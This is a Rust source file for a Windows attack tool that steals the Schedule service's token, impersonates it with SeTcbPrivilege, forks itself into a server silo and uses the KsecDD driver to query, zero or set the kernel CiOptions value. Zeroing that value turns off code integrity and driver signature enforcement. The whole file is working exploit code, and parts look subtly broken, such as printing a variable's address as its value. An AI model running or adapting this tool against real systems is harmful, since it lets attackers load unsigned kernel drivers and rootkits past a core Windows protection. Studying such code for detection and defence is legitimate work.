mod common;
use core::slice;
use std::mem::zeroed;
use std::ptr::null_mut;

use common::IpcClient;
use common::ipc;
use common::commons;
use ntapi::ntobapi::NtClose;
use ntapi::ntobapi::NtWaitForSingleObject;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::handleapi::CloseHandle;
use winapi::um::securitybaseapi::RevertToSelf;
use winapi::um::winbase::INFINITE;
use winapi::um::winnt::SE_DEBUG_NAME;
use winapi::um::winnt::SE_IMPERSONATE_NAME;
use winapi::um::winnt::SE_TCB_NAME;
use winapi::um::processenv::GetCommandLineW;
use windows::core::imp::WaitForSingleObject;
use windows::Win32::System::Threading::Sleep;

use crate::common::commons::Common;
use crate::common::nt::NtTerminateProcess;
use crate::common::nt::STATUS_SUCCESS;
use crate::common::serverSilo::ServerSilo;
use crate::common::IpcServer::IpcServer;
use crate::common::KsecDD::KsecDD;

use winapi::ctypes::wchar_t;
use winapi::shared::minwindef::{BOOL, DWORD, FALSE, TRUE};
use winapi::shared::ntdef::HANDLE;
use winapi::shared::ntdef::NULL;
use winapi::um::processthreadsapi::PROCESS_INFORMATION;
use winapi::um::shellapi::CommandLineToArgvW;


const CMD_QUERY_CI: &[u16] = &[
    'q' as u16, 'u' as u16, 'e' as u16, 'r' as u16, 'y' as u16, 'c' as u16, 'i' as u16                           //queryci
];
const CMD_DISABLE_CI: &[u16] = &[
    'd' as u16, 'i' as u16, 's' as u16, 'a' as u16, 'b' as u16, 'l' as u16, 'e' as u16, 'c' as u16, 'i' as u16   //disableci
];

const CMD_SET_CI: &[u16] = &[
    's' as u16, 'e' as u16, 't' as u16, 'c' as u16, 'i' as u16                                                   //setci
];

const CMD_CODE_QUERY_CI_CODE: i32 = 0;
const CMD_CODE_DISABLE_CI: i32 = 1;
const CMD_CODE_SET_CI: i32 = 2;
const ULONG_MAX: u32 = u32::MAX;

static mut c_b_print_verbode: BOOL = TRUE; //TRUE что бы включить сообщение
static mut c_dw_command_code: i32 = -1;
static mut c_dw_ci_options: DWORD = 0;



pub fn PrintUsage(prog: *mut wchar_t){
    println!(
        "\n\
        Usage:\n\
            {:?} <CMD> [<ARGS>]\n\
        \n\
        Query the CI options value:\n\
            {:?} {:?}\n\
        Set the CI options value to 0:\n\
            {:?} {:?}\n\
        Set the CI options value:\n\
            {:?} {:?} <VALUE>\n",
        prog,
        prog, CMD_QUERY_CI,
        prog, CMD_DISABLE_CI,
        prog, CMD_SET_CI
    );
}


pub unsafe fn ExecuteCommand(cc: i32){
    let mut ksec: KsecDD = unsafe {zeroed()};
    let mut silo: ServerSilo = unsafe { zeroed() };
    let mut h_schedule_token: HANDLE = NULL;
    let mut pi: PROCESS_INFORMATION = unsafe{zeroed()};
    let mut b_impersonation:BOOL = FALSE;
    let pseudo_handle = !0 as *mut std::ffi::c_void;

    let fr_res: BOOL = Common::EnablePrivilege(NULL, SE_IMPERSONATE_NAME.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>().as_ptr() as *mut u16);
    let sc_res: BOOL = Common::EnablePrivilege(NULL, SE_DEBUG_NAME.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>().as_ptr() as *mut u16);
    if fr_res == FALSE || sc_res == FALSE{
        println!("ERROR::MAIN::ENABLE::PRIVILEGES");
    }
    println!("Enabled required privileges.\n");


    let schedule: Vec<u16> = "Schedule".encode_utf16().chain(std::iter::once(0)).collect();
    let schedule_ptr: *mut u16 = schedule.as_ptr() as *mut u16;
    let _res: BOOL = Common::OpenServiceToken(schedule_ptr ,&mut h_schedule_token as *mut *mut c_void);
    if _res == FALSE{
        println!("ERROR::MAIN::OPEN_SERVICE_TOKEN_W::{:?}", GetLastError());
    }
    println!("Got Schedule service's token.\n");

    let _res: BOOL = Common::EnablePrivilege(h_schedule_token, SE_TCB_NAME.encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>().as_ptr() as *mut u16);
    if _res == FALSE{
        println!("ERROR::MAIN::ENABLE::PRIVILEGES::2");
    }
    println!("Enabled SeTcbPrivilege in token.\n");

    let _res: BOOL = Common::ImpresonateToken(h_schedule_token);
    if _res == FALSE{
        println!("ERROR::MAIN::IMPERSONATE_TOKEN::PRIVILEGES");
    }
    println!("Impersonating Schedule service...\n");

    b_impersonation = TRUE;

    silo.new();
    if silo.IsInitialized() == FALSE {
        unsafe{RevertToSelf()};
        unsafe{CloseHandle(h_schedule_token)};
        println!("ERROR::MAIN::SILO_INIT::PRIVILEGES");
        return;
    }
    println!("Silo created and initialized (path is {:?})", silo.GetRootDirectory());

    let _res: BOOL = Common::RevertImpresonation();
    if _res == FALSE {
        unsafe{RevertToSelf()};
        unsafe{CloseHandle(h_schedule_token)};
        println!("ERROR::MAIN::REVERT::IMPERSONATE");
    }
    println!("Revert impersonation");

    b_impersonation = TRUE;
    unsafe{CloseHandle(h_schedule_token)};
    h_schedule_token = NULL;


    if ksec.IsInitialized() == FALSE{
        unsafe{RevertToSelf()};
        unsafe{CloseHandle(h_schedule_token)};
        println!("ERROR::MAIN:SILO::INIT");
    }
    println!("Ksec initialized");

    let _res: BOOL = Common::ForkProcessIntoServerSilo(silo.GetHandle(), &mut pi);
    if _res == FALSE {
        unsafe{RevertToSelf()};
        unsafe{CloseHandle(h_schedule_token)};
        println!("ERROR::MAIN::FORK::PROCESS");
    }
    println!("Ok fork process into server silo");


    if !pi.hProcess.is_null() {
        let mut client: IpcClient::IpcClient = unsafe { zeroed::<IpcClient::IpcClient>() };
        client.new();

        let mut dw_exit_code: DWORD = 0;

        println!("Process forked child pid: {:?}", pi.dwProcessId);

        for i in 0..5 {
            Sleep(1000);
            unsafe{
                if client.connect() == TRUE {
                    break;
                }
            }

            if client.is_connected() == FALSE {
                eprintln!("ERROR::CONNECT::IPC_SERVER");
                client.disconnect();
                println!("Wait CH terminate {:?}", pi.dwProcessId);
                unsafe{NtWaitForSingleObject(pi.hProcess.try_into().unwrap(), FALSE.try_into().unwrap(), null_mut());
                if !pi.hProcess.is_null() {NtClose(pi.hProcess);};
                if !pi.hThread.is_null() {NtClose(pi.hThread);};};
            }
        }


        println!("Send PING");
        if client.send_ping_request() == FALSE {
            unsafe{NtWaitForSingleObject(pi.hProcess.try_into().unwrap(), FALSE.try_into().unwrap(), null_mut());
            if !pi.hProcess.is_null() {NtClose(pi.hProcess);};
            if !pi.hThread.is_null() {NtClose(pi.hThread);};};
        }
        println!("PING OK");

        match cc as i32{
            CMD_CODE_QUERY_CI_CODE => {
                println!("Sending Query CiOptions request...");
                if unsafe{client.send_query_ci_options_request(&raw mut c_dw_ci_options) == FALSE} {
                    unsafe{NtWaitForSingleObject(pi.hProcess.try_into().unwrap(), FALSE.try_into().unwrap(), null_mut());
                if !pi.hProcess.is_null() {NtClose(pi.hProcess);};
                if !pi.hThread.is_null() {NtClose(pi.hThread);};};
                }
                unsafe{println!("Query CiOptions request OK, current value is: 0x{:08x}", &raw mut c_dw_ci_options as u32)};
            }
            CMD_CODE_DISABLE_CI => {
                println!("Sending Disable CI request...");
                if client.send_disable_ci_request() == FALSE{
                    unsafe{NtWaitForSingleObject(pi.hProcess.try_into().unwrap(), FALSE.try_into().unwrap(), null_mut());
                if !pi.hProcess.is_null() {NtClose(pi.hProcess);};
                if !pi.hThread.is_null() {NtClose(pi.hThread);};};
                }
                println!("Disable CI request OK");
            }
            CMD_CODE_SET_CI => {
                println!("Sending Set CiOptions request...");
                if client.send_set_ci_options_request(c_dw_ci_options) == FALSE {
                    unsafe{NtWaitForSingleObject(pi.hProcess.try_into().unwrap(), FALSE.try_into().unwrap(), null_mut());
                if !pi.hProcess.is_null() {NtClose(pi.hProcess);};
                if !pi.hThread.is_null() {NtClose(pi.hThread);};};
                }
                println!("Set CiOptions request OK");
            }
            _ => {
                eprintln!("ERROR: Unknown command code: {}", cc);
            }
        }


        println!("Send PING");
        if client.send_ping_request() == FALSE {
            unsafe{NtWaitForSingleObject(pi.hProcess.try_into().unwrap(), FALSE.try_into().unwrap(), null_mut());
                if !pi.hProcess.is_null() {NtClose(pi.hProcess);};
                if !pi.hThread.is_null() {NtClose(pi.hThread);};};
        }
        println!("PING OK");
    }
    else{
        let mut server = unsafe { zeroed::<IpcServer>() };
        server.new();        
        let mut h_listen_thread: HANDLE = NULL;
        
        if ksec.Connect() == TRUE{
            unsafe{NtTerminateProcess(pseudo_handle as _, STATUS_SUCCESS)};
        }

        if server.is_initialized() == FALSE || server.SetKsecClient(ksec.clone()) == FALSE || common::IpcServer::IpcServer::ListenInThread(&server, &mut h_listen_thread) == FALSE{
            unsafe{
                CloseHandle(h_listen_thread);
                ksec.Disconnect();
                NtTerminateProcess(pseudo_handle as _, STATUS_SUCCESS)
            };
        }
        WaitForSingleObject(h_listen_thread as isize, INFINITE);
    }

    unsafe{RevertToSelf()};
    unsafe{CloseHandle(h_schedule_token)};
    println!("ALL DONE");
    
}



unsafe fn wchar_ptr_to_str(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    // Найти длину UTF-16 строки (до нулевого терминатора)
    let mut len = 0;
    while *ptr.add(len) != 0 {
        len += 1;
    }
    // Создать срез из указателя и длины
    let slice = slice::from_raw_parts(ptr, len);
    // Преобразовать в Rust String
    String::from_utf16_lossy(slice)
}


unsafe fn utf16_strlen(ptr: *const u16) -> usize {
    let mut len = 0;
    while *ptr.add(len) != 0 {
        len += 1;
    }
    len
}

fn main() {
    let mut argv: *mut *mut u16;
    let mut argc: i32 = 0;

    argv = unsafe{CommandLineToArgvW(GetCommandLineW(), &mut argc)};

    if argc >= 2 {
        let _slice = unsafe {std::slice::from_raw_parts(*argv.offset(1), utf16_strlen(*argv.offset(1)))};
        let _res: BOOL = unsafe{(String::from_utf16_lossy(_slice).eq_ignore_ascii_case(&String::from_utf16_lossy(CMD_QUERY_CI))) as i32};
        if _res == TRUE{
            unsafe{ExecuteCommand(CMD_CODE_QUERY_CI_CODE as i32)};
            return;
        }

        let _res: BOOL = (String::from_utf16_lossy(_slice).eq_ignore_ascii_case(&String::from_utf16_lossy(CMD_DISABLE_CI))) as BOOL;
        if _res == TRUE{
            unsafe{ExecuteCommand(CMD_CODE_DISABLE_CI as i32)};
            return;
        }

        let _res: BOOL = (String::from_utf16_lossy(_slice).eq_ignore_ascii_case(&String::from_utf16_lossy(CMD_SET_CI))) as BOOL;
        if _res == TRUE{
            if argc >= 3 {
                let value = unsafe{u32::from_str_radix(&String::from_utf16_lossy(std::slice::from_raw_parts(*argv.offset(2), (0..).take_while(|&i| *argv.offset(2).add(i) != null_mut()).count())).trim_start(), 0).unwrap()};
                unsafe{c_dw_ci_options = value};
                if unsafe{c_dw_ci_options != 0 && c_dw_ci_options != ULONG_MAX}{
                    unsafe{ExecuteCommand(CMD_CODE_SET_CI as i32)};
                    return;
                }else{
                    unsafe{eprintln!("Failed to parse input value (or supplied value was 0): {:?}", *argv.offset(2))};
                    return;
                }
            }
        }else{
            unsafe{eprintln!("UNCNOWN::COMMAND::{:?}", *argv.offset(1))};
            return;
        }

    }

    unsafe{PrintUsage(*argv.offset(0))};
    return;
}
